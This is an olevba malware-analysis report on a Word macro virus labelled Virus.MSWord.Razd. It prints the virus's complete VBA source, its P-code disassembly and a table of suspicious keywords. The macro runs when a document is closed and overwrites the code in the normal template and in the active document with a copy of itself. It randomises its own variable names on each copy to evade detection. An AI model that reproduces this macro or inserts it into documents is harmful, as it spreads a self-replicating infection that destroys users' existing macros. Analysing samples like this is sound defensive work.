olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Razd
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Razd - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'Razdego

Private Sub Document_Close()

KODWER = KODWER + 1

If Word.Templates(1).VBProject.VBComponents(1).CodeModule.Lines(KODWER, 2 - 1) <> "'Razdego" Then
    
     With Word.Templates(KODWER).VBProject.VBComponents(KODWER).CodeModule
     
        .DeleteLines KODWER, .CountOfLines
        
        .AddFromString kljuc(ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(KODWER, _
ThisDocument.VBProject.VBComponents(KODWER).CodeModule.CountOfLines))

        
     End With
    
End If

If Word.ActiveDocument.VBProject.VBComponents(KODWER).CodeModule.Lines(KODWER, 2 - 1) <> "'Razdego" Then

    With Word.ActiveDocument.VBProject.VBComponents(KODWER).CodeModule
    
        .DeleteLines KODWER, .CountOfLines
        
        .AddFromString kljuc(ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(KODWER, _
ThisDocument.VBProject.VBComponents(KODWER).CodeModule.CountOfLines))

        
    End With
    
End If

End Sub
Private Function kljuc(JIDWER)

Dim v(3)

v(1) = "LKJASD": v(2) = "KODWER": v(3) = "JIDWER"

For t = 1 To 3

Novi = Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & _
Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65)

While InStr(1, JIDWER, v(t), vbTextCompare)

LKJASD = InStr(1, JIDWER, v(t), vbTextCompare)
    
JIDWER = Mid(JIDWER, 1, LKJASD - 1) & Novi & Mid(JIDWER, LKJASD + Len(v(t)), Len(JIDWER) - LKJASD)

Wend

Next

kljuc = JIDWER

End Functi

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Razd
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 7485 bytes
' Line #0:
' Line #1:
' 	QuoteRem 0x0000 0x0007 "Razdego"
' Line #2:
' Line #3:
' 	FuncDefn (Private Sub Document_Close())
' Line #4:
' Line #5:
' 	Ld KODWER 
' 	LitDI2 0x0001 
' 	Add 
' 	St KODWER 
' Line #6:
' Line #7:
' 	Ld KODWER 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld Word 
' 	ArgsMemLd Templates 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0008 "'Razdego"
' 	Ne 
' 	IfBlock 
' Line #8:
' Line #9:
' 	StartWithExpr 
' 	Ld KODWER 
' 	Ld KODWER 
' 	Ld Word 
' 	ArgsMemLd Templates 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #10:
' Line #11:
' 	Ld KODWER 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #12:
' Line #13:
' 	LineCont 0x0004 13 00 00 00
' 	Ld KODWER 
' 	Ld KODWER 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd kljuc 0x0001 
' 	ArgsMemCallWith AddFromString 0x0001 
' Line #14:
' Line #15:
' Line #16:
' 	EndWith 
' Line #17:
' Line #18:
' 	EndIfBlock 
' Line #19:
' Line #20:
' 	Ld KODWER 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Sub 
' 	Ld KODWER 
' 	Ld Word 
' 	MemLd ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0008 "'Razdego"
' 	Ne 
' 	IfBlock 
' Line #21:
' Line #22:
' 	StartWithExpr 
' 	Ld KODWER 
' 	Ld Word 
' 	MemLd ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #23:
' Line #24:
' 	Ld KODWER 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #25:
' Line #26:
' 	LineCont 0x0004 13 00 00 00
' 	Ld KODWER 
' 	Ld KODWER 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd kljuc 0x0001 
' 	ArgsMemCallWith AddFromString 0x0001 
' Line #27:
' Line #28:
' Line #29:
' 	EndWith 
' Line #30:
' Line #31:
' 	EndIfBlock 
' Line #32:
' Line #33:
' 	EndSub 
' Line #34:
' 	FuncDefn (Private Function kljuc(JIDWER, id_FFFE As Variant))
' Line #35:
' Line #36:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0003 
' 	VarDefn v
' Line #37:
' Line #38:
' 	LitStr 0x0006 "LKJASD"
' 	LitDI2 0x0001 
' 	ArgsSt v 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "KODWER"
' 	LitDI2 0x0002 
' 	ArgsSt v 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "JIDWER"
' 	LitDI2 0x0003 
' 	ArgsSt v 0x0001 
' Line #39:
' Line #40:
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	For 
' Line #41:
' Line #42:
' 	LineCont 0x0004 26 00 00 00
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Novi 
' Line #43:
' Line #44:
' 	LitDI2 0x0001 
' 	Ld JIDWER 
' 	Ld t 
' 	ArgsLd v 0x0001 
' 	Ld vbTextCompare 
' 	FnInStr4 
' 	While 
' Line #45:
' Line #46:
' 	LitDI2 0x0001 
' 	Ld JIDWER 
' 	Ld t 
' 	ArgsLd v 0x0001 
' 	Ld vbTextCompare 
' 	FnInStr4 
' 	St LKJASD 
' Line #47:
' Line #48:
' 	Ld JIDWER 
' 	LitDI2 0x0001 
' 	Ld LKJASD 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	Ld Novi 
' 	Concat 
' 	Ld JIDWER 
' 	Ld LKJASD 
' 	Ld t 
' 	ArgsLd v 0x0001 
' 	FnLen 
' 	Add 
' 	Ld JIDWER 
' 	FnLen 
' 	Ld LKJASD 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St JIDWER 
' Line #49:
' Line #50:
' 	Wend 
' Line #51:
' Line #52:
' 	StartForVariable 
' 	Next 
' Line #53:
' Line #54:
' 	Ld JIDWER 
' 	St kljuc 
' Line #55:
' Line #56:
' 	Reparse 0x000A "End Functi"
' Line #57:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

